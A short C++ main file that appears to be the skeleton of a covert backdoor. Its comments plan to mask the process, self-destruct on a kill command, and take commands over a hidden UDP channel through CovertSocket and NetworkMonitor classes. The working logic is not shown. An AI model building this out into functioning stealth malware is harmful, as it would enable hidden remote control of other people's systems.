#include <iostream>
#include "NetworkMonitor.h"
#include "CovertSocket.h"

int main() {

    //mask the program


    //register listening for kill commands. when killed we destroy ourselves


    //find listening items


    TrafficAnalyzer * trafficAnalyzer = new TrafficAnalyzer();
    //start monitoring for UDP traffic. If it is our own, it needs handling, if not, add it to traffic analyzer
    CovertSocket * socket = new CovertSocket(trafficAnalyzer); //how we respond to commands
    NetworkMonitor * monitor = new NetworkMonitor(trafficAnalyzer); //how we listen for commands
    while(1){

        monitor->listenForTraffic(); //this will hang until a single unit of data is received and then return it


    }


    return 0;
}